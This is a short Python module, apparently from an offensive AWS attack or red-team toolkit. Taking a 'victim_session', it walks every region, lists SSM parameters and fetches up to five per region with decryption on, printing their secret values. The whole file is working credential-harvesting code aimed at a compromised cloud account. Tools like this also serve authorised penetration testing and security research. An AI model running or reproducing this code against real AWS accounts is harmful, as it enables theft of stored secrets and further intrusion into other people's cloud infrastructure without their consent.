from colorama import Fore
import json, sys
from modules.utils import custom_serializer
import modules.globals as my_globals

def ssm_init_enum(victim_session, attacker_session):
    list_ssm_parameters(victim_session)

def list_ssm_parameters(victim_session):
    print(f"{Fore.GREEN}Enumerating SSM Parameters...")
    for region in my_globals.aws_regions:
        try:
            ssm_client = victim_session.client("ssm", region_name=region)
            params = ssm_client.describe_parameters().get("Parameters", [])
            for param in params[:5]:
                print(f"{Fore.MAGENTA}\nRegion: {region} | SSM Parameter: {param['Name']}")
                try:
                    value = ssm_client.get_parameter(Name=param['Name'], WithDecryption=True).get("Parameter", {})
                    print(f"{Fore.YELLOW}{json.dumps(value, indent=4, sort_keys=True, default=custom_serializer)}")
                except:
                    print(f"{Fore.LIGHTBLACK_EX}Failed to get value for parameter: {param['Name']}")
        except:
            sys.stdout.write("\r\033[K")
            sys.stdout.write(f"{Fore.LIGHTBLACK_EX}Failed to list SSM parameters in region {region}")
            sys.stdout.flush()
    print("")